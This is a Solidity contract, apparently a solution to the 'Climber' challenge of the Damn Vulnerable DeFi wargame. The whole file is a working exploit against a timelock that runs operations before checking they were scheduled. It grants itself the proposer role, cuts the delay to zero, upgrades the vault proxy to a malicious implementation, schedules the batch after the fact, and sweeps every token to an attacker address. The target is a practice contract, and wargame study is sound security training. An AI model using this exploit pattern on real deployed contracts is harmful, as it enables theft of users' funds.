// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "../climber/ClimberTimelock.sol";
import "./AttackVault.sol";
import "../DamnValuableToken.sol";

contract AttackClimberTimelock {
    //calldata for schedule/execute
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;
    //needed address
    address payable public timelock;
    address public oldVault;
    address public newVault;

    address public attacker;
    address public token;

    constructor(
        address payable _timelock,
        address _oldVault,
        address _newVault,
        address _attacker,
        address _token
    ) {
        timelock = _timelock;
        oldVault = _oldVault;
        newVault = _newVault;
        attacker = _attacker;
        token = _token;
    }

    function attack() external {
        //1) give us the proposer role
        targets.push(timelock);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );

        //2) reduce delay to 0
        targets.push(timelock);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("updateDelay(uint64)", uint64(0))
        );

        //3) upgrade the vault implementation to our new AttackVault contract
        targets.push(oldVault);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("upgradeTo(address)", newVault)
        );

        //4) call our schedule function which will call schedule of timelock
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("ourSchedule()"));

        //call execute
        ClimberTimelock(timelock).execute(
            targets,
            values,
            dataElements,
            bytes32("")
        );

        //Now that the implementation has upgraded to the new vault, we can sweep the funds and send them to our attacker account
        AttackVault(oldVault).sweepFunds(token);
        DamnValuableToken(token).transfer(
            attacker,
            DamnValuableToken(token).balanceOf(address(this))
        );
    }

    //only use to get the right calldata to get the right OperationId
    function ourSchedule() public {
        ClimberTimelock(timelock).schedule(
            targets,
            values,
            dataElements,
            bytes32("")
        );
    }
}
